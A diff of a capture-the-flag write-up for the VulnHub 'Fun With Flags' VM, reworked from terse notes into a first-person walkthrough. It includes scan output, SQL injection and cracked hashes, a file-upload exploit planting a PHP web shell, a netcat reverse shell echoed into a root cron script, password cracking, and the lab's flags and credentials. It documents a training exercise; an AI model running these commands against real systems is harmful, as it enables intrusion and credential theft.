@@ -1,41 +1,12 @@
 # Fun With Flags!
 
-https://www.vulnhub.com/entry/tbbt-funwithflags,437/
+Link: https://www.vulnhub.com/entry/tbbt-funwithflags,437/
 
-## Flags!
+This was my first vulnhub vm, almost my first hacked anything, and the first time I have used kali in anger (literally at times, when it kept freezing). It took me maybe four days to get all the flags - one and a half days stuck after getting the first two. I got the last two with some hints from the creator, but managed to get root without help (flag 4, leonard) so I was really happy with myself :_
 
-nc 192.168.1.105 1337
+## Step 1: nmap scan for open ports:
 
-    FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}
-
-Via sql injection, retrieving description from users table:
-
-    FLAG-bernadette{f42d950ab0e966198b66a5c719832d5f}
-
-Via strings on her secretdiary in her home folder:
-
-    FLAG-amy{60263777358690b90e8dbe8fea6943c9}
-
-In a file under /root, after getting a root shell:
-
-    FLAG-leonard{17fc95224b65286941c54747704acd3e}       
-
-Via grep on all files as root, discovered in a db file for the wordpress site:
-This flag is also available if you search for 'flag' in the main wordpress site (i am dumb).
-
-    FLAG-raz{40d17a74e28a62eac2df19e206f0987c}
-
-After a hint from the creator, found the flag as a hidden file in penny's home dir. A base64 decode revealed:
-
-    FLAG-penny{dace52bdb2a0b3f899dfb3423a992b25}
-    
-The last and hardest flag, after a hint from the creator (i didn't know what rockyou was, and he said I had to do it twice):
-
-    FLAG-howard{b3d1baf22e07874bf744ad7947519bf4}
-    
-Found after getting howards zip and cracking with john the ripper to get a sketch image. Then using stegcracker to get the message out of the image, both using the rockyou word list.
-
-## Open ports:
+This is from a straight `nmap -p- 192.168.1.105`
 
 ```
 PORT     STATE SERVICE
@@ -45,30 +16,25 @@ PORT     STATE SERVICE
 1337/tcp open  waste
 ```
 
-## Penny's password
-
-Found in her folder under pub on the ftp server:
-
-    pennyisafreeloader
-
-## Penny's username on pharma site:
-
-Found under bernadette's folder under pub on the ftp server:
-
-    penny69
-
-## Robots.txt on website
+I immediately netcatted the 1337 port to get the first flag, sheldons:
 
 ```
-User-Agent: *
-Disallow:
-Disallow: /howard
-Disallow: /web_shell.php
-Disallow: /backdoor
-Disallow: /rootflag.txt
+> nc 192.168.1.105 1337
+FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}
+>
 ```
+
+## FTP enumeration
+
+Next I connected to ftp and browsed around. Of note was penny's username and password, the former in a note in bernadette's folder and the latter in penny's:
+
+`penny69:pennyisafreeloader`
+
+Also, under howard's folder was a zip file that contained an image locked up with a passcode. I attacked this last in my work, later, after a hint from the creator (which was helpful since I knew nothing about password cracking).
 
 ## Nikto output
+
+Next I ran nikto on the website.
 
 For `nikto -host 192.168.1.105`
 
@@ -101,6 +67,8 @@ For `nikto -host 192.168.1.105`
 + 1 host(s) tested
 ```
 
+Once I saw it had a private sub dir, its own subsection talking about bigpharma (which was mentioned in the note where penny's username was found):
+
 For `nikto -host http://192.168.1.105/private`:
 
 ```
@@ -131,10 +99,12 @@ For `nikto -host http://192.168.1.105/private`:
 
 ## Login big pharma - SQL vector
 
-After logging in through /private/login.php, penny69:pennyisafreeloader gets to the search page. 
-Searching for `'` returns `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1`
+After logging in through /private/login.php, penny69:pennyisafreeloader gets to a search page. 
+Searching for `'` returns `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1`, so its susceptible to sql injection.
 
 ## Using above sql injection to get password hashes
+
+I eventually managed to get a dump of the users table, where I got my second flag, bernadette's:
 
 ```
 admin	3fc0a7acf087f549ac2b266baf94b8b1	    josh	    Dont mess with me
@@ -144,337 +114,41 @@ mitsos1981	05d51709b81b7e0f1a9b6b4b8273b217	dimitris	Opa re malaka!
 alicelove	e146ec4ce165061919f887b70f49bf4b	alice	    Eat Pray Love
 bernadette	dc5ab2b32d9d78045215922409541ed7	bernadette  FLAG-bernadette{f42d950ab0e966198b66a5c719832d5f}
 ```
-Using reverse hashes, 
+
+I used an online md5 hash rainbow table to reverse several of the above passwords.
 
 - `admin` reverses to `qwerty123`
 - `mitsos1981` reverses to `souvlaki`
 - `bernadette` reverses to `howard`
 
-The others were not reversable.
-
-None of the above worked with ssh. They also didn't work with phpMyAdmin.
+The others were not reversable. None of these worked with ssh, and they also didn't work with the phpMyAdmin interface nikto found.
 
 ## Enumerated web dirs
 
-Nikto and wfuzz both found:
+I tried a few other types of enumeration (dirbuster, legion, wfuzz) to get my next steps, without success. For example via `wfuzz` with various wordlists I found:
 
 - /howard, which contains a secret_data folder containing a joke gif and joke text file
 - /javascript which gives access denied
 - /music which returns 200 but nothing else
 - /private leading to the website
+- /private/css with just the base css for the pharma site
 - /phpmyadmin
 
-/private also contains a css folder with just the base css
+None of the above was useful. In such a state I was stuck for a day and a half.
 
 ## dirb enumeration
 
-DirB found a bunch of stuff, including indications /music might be a word press site.
+I started reading the author's writeup's of his own vulnhub efforts, reading his techniques and hopeing they might reveal a way of thinking to get me forward. In such a fashion I learned about dirb, which is not the same thing as dirbuster. When I ran it against the site, it found all the same things as the other tools but also, crucially:
 
 ```
------------------
-DIRB v2.22    
-By The Dark Raver
------------------
-
-START_TIME: Thu Mar 12 14:58:58 2020
-URL_BASE: http://192.168.1.105/
-WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-
------------------
-
-GENERATED WORDS: 4612                                                          
-
----- Scanning URL: http://192.168.1.105/ ----
-+ http://192.168.1.105/index.html (CODE:200|SIZE:239)                                                                                             
-==> DIRECTORY: http://192.168.1.105/javascript/                                                                                                   
-==> DIRECTORY: http://192.168.1.105/music/                                                                                                        
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/                                                                                                   
-==> DIRECTORY: http://192.168.1.105/private/                                                                                                      
-+ http://192.168.1.105/robots.txt (CODE:200|SIZE:112)                                                                                             
-+ http://192.168.1.105/server-status (CODE:403|SIZE:301)                                                                                          
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/javascript/ ----
-==> DIRECTORY: http://192.168.1.105/javascript/jquery/                                                                                            
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/music/ ----
-+ http://192.168.1.105/music/index.html (CODE:200|SIZE:0)                                                                                         
-==> DIRECTORY: http://192.168.1.105/music/wordpress/                                                                                              
-                                                                                                                                                   
----- Entering directory: http://192.168.1.105/phpmyadmin/ ----                                                                                     
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/doc/                                                                                                
-+ http://192.168.1.105/phpmyadmin/favicon.ico (CODE:200|SIZE:22486)                                                                                
-+ http://192.168.1.105/phpmyadmin/index.php (CODE:200|SIZE:10344)                                                                                  
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/js/                                                                                                 
-+ http://192.168.1.105/phpmyadmin/libraries (CODE:403|SIZE:308)                                                                                    
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/                                                                                             
-+ http://192.168.1.105/phpmyadmin/phpinfo.php (CODE:200|SIZE:10346)                                                                                
-+ http://192.168.1.105/phpmyadmin/setup (CODE:401|SIZE:460)                                                                                        
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/sql/                                                                                               
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/templates/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/themes/                                                                                            
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/private/ ----
-==> DIRECTORY: http://192.168.1.105/private/css/                                                                                                  
-+ http://192.168.1.105/private/index.php (CODE:200|SIZE:685)                                                                                      
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/javascript/jquery/ ----
-+ http://192.168.1.105/javascript/jquery/jquery (CODE:200|SIZE:284394)                                                                            
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/music/wordpress/ ----
-+ http://192.168.1.105/music/wordpress/index.php (CODE:301|SIZE:0)                                                                                
-==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-admin/                                                                                     
-==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-content/                                                                                   
-==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-includes/                                                                                  
-+ http://192.168.1.105/music/wordpress/xmlrpc.php (CODE:405|SIZE:42)                                                                              
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/doc/ ----
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/doc/html/                                                                                          
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/js/ ----
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/js/jquery/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/js/transformations/                                                                                
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/ ----
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/az/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/bg/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/ca/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/cs/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/da/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/de/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/el/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/es/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/et/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/fi/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/fr/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/gl/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/hu/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/ia/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/id/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/it/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/ja/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/ko/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/lt/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/nl/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/pl/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/pt/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/pt_BR/                                                                                      
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/ro/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/ru/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/si/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/sk/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/sl/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/sq/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/sv/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/tr/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/uk/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/vi/                                                                                         
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/zh_CN/                                                                                      
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/zh_TW/                                                                                      
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/sql/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/templates/ ----
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/templates/components/                                                                              
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/templates/database/                                                                                
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/templates/error/                                                                                   
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/templates/javascript/                                                                              
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/templates/list/                                                                                    
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/templates/navigation/                                                                              
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/templates/table/                                                                                   
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/templates/test/                                                                                    
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/themes/ ----
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/themes/original/                                                                                   
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/private/css/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/music/wordpress/wp-admin/ ----
-+ http://192.168.1.105/music/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)                                                                       
-==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-admin/css/                                                                                 
-==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-admin/images/                                                                              
-==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-admin/includes/                                                                            
-+ http://192.168.1.105/music/wordpress/wp-admin/index.php (CODE:302|SIZE:0)                                                                       
-==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-admin/js/                                                                                  
-==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-admin/maint/                                                                               
-==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-admin/network/                                                                             
-==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-admin/user/                                                                                
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/music/wordpress/wp-content/ ----
-+ http://192.168.1.105/music/wordpress/wp-content/index.php (CODE:200|SIZE:0)                                                                     
-==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-content/plugins/                                                                           
-==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-content/themes/                                                                            
-==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-content/upgrade/                                                                           
-==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-content/uploads/                                                                           
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/music/wordpress/wp-includes/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/doc/html/ ----
-+ http://192.168.1.105/phpmyadmin/doc/html/index.html (CODE:200|SIZE:12811)                                                                       
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/js/jquery/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/js/transformations/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/az/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/bg/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/ca/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/cs/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/da/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/de/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/el/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/es/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/et/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/fi/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/fr/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/gl/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/hu/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/ia/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/id/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/it/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/ja/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/ko/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/lt/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/nl/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/pl/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/pt/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/pt_BR/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/ro/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/ru/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/si/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/sk/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/sl/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/sq/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/sv/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/tr/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/uk/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/vi/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/zh_CN/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/locale/zh_TW/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/templates/components/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/templates/database/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/templates/error/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/templates/javascript/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/templates/list/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/templates/navigation/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/templates/table/ ----
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/templates/table/chart/                                                                             
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/templates/table/search/                                                                            
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/templates/test/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/themes/original/ ----
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/themes/original/css/                                                                               
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/themes/original/img/                                                                               
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/themes/original/jquery/                                                                            
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/music/wordpress/wp-admin/css/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/music/wordpress/wp-admin/images/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/music/wordpress/wp-admin/includes/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/music/wordpress/wp-admin/js/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/music/wordpress/wp-admin/maint/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/music/wordpress/wp-admin/network/ ----
-+ http://192.168.1.105/music/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)                                                               
-+ http://192.168.1.105/music/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)                                                               
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/music/wordpress/wp-admin/user/ ----
-+ http://192.168.1.105/music/wordpress/wp-admin/user/admin.php (CODE:302|SIZE:0)                                                                  
-+ http://192.168.1.105/music/wordpress/wp-admin/user/index.php (CODE:302|SIZE:0)                                                                  
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/music/wordpress/wp-content/plugins/ ----
-+ http://192.168.1.105/music/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0)                                                             
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/music/wordpress/wp-content/themes/ ----
-+ http://192.168.1.105/music/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0)                                                              
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/music/wordpress/wp-content/upgrade/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/music/wordpress/wp-content/uploads/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/templates/table/chart/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/templates/table/search/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/themes/original/css/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/themes/original/img/ ----
-                                                                                                                                                  
----- Entering directory: http://192.168.1.105/phpmyadmin/themes/original/jquery/ ----
-==> DIRECTORY: http://192.168.1.105/phpmyadmin/themes/original/jquery/images/ 
-                                                                                                                                                  
------------------
-END_TIME: Thu Mar 12 15:03:58 2020
-DOWNLOADED: 332064 - FOUND: 23
+==> DIRECTORY: http://192.168.1.105/music/wordpress/
 ```
 
-So next step might be wpscan...
+The empty dir was in fact hosting a wordpress site. Progress!
 
-## Wp-scan and reflex gallery
+## wpscan and reflex gallery
 
-After browsing around the wp site, wpscan was run. It picked up some users etc, but also a plugin called reflex-gallery 3.1.3, which has a fil upload vulnerability.
+After browsing around the wp site, I ran `wpscan`. It picked up some users etc, but also a plugin called `reflex-gallery 3.1.3`, which has a file upload vulnerability.
 
 I created the following form to exploit it, based on the listed exploit on [exploitdb](https://www.exploit-db.com/exploits/36374):
 
@@ -487,11 +161,13 @@ I created the following form to exploit it, based on the listed exploit on [expl
 
 and uploaded the php shell from here: [flozz/p0wny-shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php)
 
-This gave me a shell on the machine when I browsed to it (it was under wp-content/uploads), running under www-data but which seemed to have a lot of access. Going through the user dirs, I found an exe in amy's dir that revealed a flag when run through `strings`
+This gave me a shell on the machine when I browsed to it (it was under `wp-content/uploads/2020/03`), running under www-data but which seemed to have a lot of access. Going through the user dirs, I found an exe in amy's dir that revealed a flag when run through `strings`:
+
+`FLAG-amy{60263777358690b90e8dbe8fea6943c9}`
 
 ## Leonard's cron job
 
-Leonards home dir had a shell script, owned by root, that was run by root every minute. And was writable.
+Leonards home dir had a shell script, owned by root. It contained a comment saying that it was run every minute, and it was also writeable.
 
 I echoed the following command into it and got a reverse shell via netcat: `echo "nc.traditional -e /bin/bash 192.168.1.3 1235" > thermostat_set_temp.sh`, running `nc -nvlp 1235` on the kali machine. This gave me a root shell!
 
@@ -527,16 +203,27 @@ I then changed penny's password to `hacktheplanet` via `passwd penny`, and made 
 
 ## Deeper access to footprints on the moon
 
-Raz's flag is in the wp blog, so I decided to get in there. Step 1, Find the db by cat wp-config.php. 2, connect to db using the mysql command-line tool. Step 3, update the main users password using `UPDATE `wp_users` SET `user_pass` = MD5( 'hacktheplanet' ) WHERE `wp_users`.`user_login` = "footprintsonthemoon";`, step 4, login to admin dashboard.
+I did a `grep -r FLAG- / 2>/dev/null` to try and find the other flags. Raj's flag was in one of the wordpress databases.
 
-Via this I was able to find a page list that included a page called 'secret', containing raj's flag.
+If I was smart at this point, I would have simply navigated to the wordpress site and done a search. However I had read my way through the site and done view source searches and had not found anything, so I thought it must be hidden in the backend settings somewhere, and so I decided to get into the word press database.
+
+1. I got the db name and credentials by `cat wp-config.php`
+2. I connected to the db using the mysql command-line tool. 
+3. I updated the main users password using `UPDATE wp_users SET user_pass = MD5( 'hacktheplanet' ) WHERE wp_users.user_login = "footprintsonthemoon";`
+4. I logged in to admin dashboard.
+
+Via this I was able to find a page list that included a page called 'secret', containing raj's flag. This page, while unlinked, is fully available through search on the main site, too /facepalm. However it was fun learning: `FLAG-raz{40d17a74e28a62eac2df19e206f0987c}`
 
 ## Creator's hints
 
-The creator DM'd me some hints, including that 'penny likes to hide her files'. I found Penny's flag as a hidden file in her home dir, base64 encoded. The second hint was for howard's flag, where the creator first suggested it was in his zip file on ftp (which i already guessed) then that I might need to 'rockyou' it twice.
+The creator DM'd me some hints, including that 'penny likes to hide her files'. I found Penny's flag as a hidden file in her home dir, base64 encoded: `FLAG-penny{dace52bdb2a0b3f899dfb3423a992b25}`. 
+
+The second hint was for howard's flag, where the creator first suggested it was in his zip file on ftp (which I already guessed), and then that I might need to 'rockyou' it twice.
 
 I looked around word press thinking this was some show reference, but then did a google and found its actually the name of a common word list on kali, a 130+ meg list of common passwords. I used it with john the ripper to crack the zip, allowing me to extract an image of the mars rover. john used rockyou and ran in half a second to get the password `astronaut`
 
-The image had nothing in it that I could see for the flag, but given that it was the only thing in the file, that I was sure the flag was in it somewhere, and that the author had said I need to rockyou twice (crack two passwords) I guessed that it was a stegographic image. `steghide` is a tool that will encode and decode messages in images, however, it requires a passphrase to decode. After some googling I found `stegcracker`, a tool that will brute force using a word list and steghide. And the word list defaults to using rockyou again :)
+The image had nothing in it that I could see for the flag, but given that it was the only thing in the file, that I was sure the flag was in it somewhere, and that the author had said I need to 'rockyou' twice (crack two passwords) I guessed that it was a stegographic image. 
 
-stegcracker was much, much slower than john, but fortunately it found the password after a few minutes in the first 0.3% of rockyou's passwords, `iloveyoumom`. The output file contained the final flag.
+`steghide` is a tool that will encode and decode messages in images, however, it requires a passphrase to decode. After some googling I found `stegcracker`, a tool that will brute force using a word list and steghide. And the word list defaults to using rockyou again :)
+
+stegcracker was much, much slower than john, but fortunately it found the password after a few minutes in the first 0.3% of rockyou's passwords, `iloveyoumom`. The output file contained the final flag: `FLAG-howard{b3d1baf22e07874bf744ad7947519bf4}`.
